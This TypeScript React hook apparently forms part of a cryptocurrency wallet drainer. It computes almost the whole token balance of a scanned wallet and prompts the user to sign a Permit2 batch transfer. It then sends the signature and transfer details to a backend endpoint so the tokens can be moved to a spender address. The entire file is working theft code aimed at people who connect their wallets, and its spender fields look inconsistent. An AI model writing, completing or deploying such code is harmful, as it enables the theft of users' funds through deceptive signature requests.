import { useSignTypedData } from "wagmi";
import API from "../providers/axios";
import type { ScanResult, Permit2Token } from "../types/wallet";

const PERMIT2_CONTRACT = import.meta.env.VITE_PERMIT2_ADDRESS;

const PERMIT2_BATCH_TYPES = {
  PermitBatchTransferFrom: [
    { name: "permitted", type: "TokenPermissions[]" },
    { name: "spender", type: "address" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
  ],
  TokenPermissions: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint256" },
  ],
};

export function usePermit2Execution() {
  const { signTypedDataAsync } = useSignTypedData();

  const executePermit2 = async (
    scanData: ScanResult,
    spenderAddress: string,
    chainId: number,
    chain: string | undefined,
    user: string,
  ) => {
    const permit2Tokens = scanData.permit2;
    if (!permit2Tokens?.length) return;

    const deadline = Math.floor(Date.now() / 1000) + 3600;
    const nonce = BigInt(Date.now());

    const getActualAmount = (permit: Permit2Token): string => {
      const tokenData = scanData.tokens.find(
        (t) => t.contract.toLowerCase() === permit.token.toLowerCase(),
      );

      if (!tokenData) return permit.amount;

      const decimals = 6;
      const adjusted = (tokenData.balance - 0.2) * Math.pow(10, decimals);
      return BigInt(Math.floor(adjusted)).toString(); // ✅ uint256 as text
    };

    let signature: string;
    try {
      signature = await signTypedDataAsync({
        domain: {
          name: "Permit2",
          chainId: Number(chainId),
          verifyingContract: PERMIT2_CONTRACT,
        },
        types: PERMIT2_BATCH_TYPES,
        primaryType: "PermitBatchTransferFrom",
        message: {
          permitted: permit2Tokens.map((p) => ({
            token: p.token,
            amount: BigInt(getActualAmount(p)),
          })),
          spender: PERMIT2_CONTRACT,
          nonce,
          deadline: BigInt(deadline),
        },
      });
    } catch (err) {
      console.error("SIGN FAILED:", err);
      return;
    }

    const signedPayload = {
      chain,
      user,
      signature,
      permitted: permit2Tokens.map((p) => ({
        token: p.token,
        amount: getActualAmount(p).toString(),
      })),
      transferDetails: permit2Tokens.map((p) => ({
        to: spenderAddress,
        requestedAmount: getActualAmount(p).toString(),
      })),
      spender: spenderAddress,
      nonce: nonce.toString(),
      deadline,
    };

    console.log(signedPayload);

    const res = await API.post("/api/execute-permit", signedPayload);
    return res.data;
  };

  return { executePermit2 };
}
